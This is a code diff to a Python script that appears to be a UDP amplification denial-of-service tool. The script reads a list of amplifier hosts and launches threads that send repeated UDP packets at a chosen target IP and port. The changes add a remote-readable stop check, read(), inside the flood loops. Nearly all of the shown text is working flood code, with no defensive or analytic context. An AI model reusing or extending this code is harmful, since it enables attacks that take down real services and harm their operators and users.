@@ -1,4 +1,5 @@
 import socket,threading,sys
+from MODEL.data import read
 
 def requests(ip,port,path):
     try:
@@ -16,6 +17,7 @@ def DOS(ip,port,amp,booter,times,path):
     packet = requests(raw_amp[0],int(port2),path)
     try:
        for _ in range(times):
+        if read() == True:break
         s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
         [s.sendto(packet,((ip,port))) for _ in range(booter)]
     except:pass
@@ -35,12 +37,14 @@ else:
 with open(files,'r') as f:
     amp = []
     for a in f.readlines():
+        if read() == True:break
         ip_amp = a.replace('\n','').replace('\r','').split(' ')
         if ip_amp[0] not in amp:
             try:amp.append(f'{ip_amp[0]} {ip_amp[1]}')
             except:amp.append(f'{ip_amp[0]} /')
     if load == 1:print('\n')
     for ip_amp in amp:
+      if read() == True:break
       raw = ip_amp.split(' ')
       if raw[0] != '':threading.Thread(target=DOS,args=(ip,port,raw[0],booter,times,raw[1])).start()
     exit()
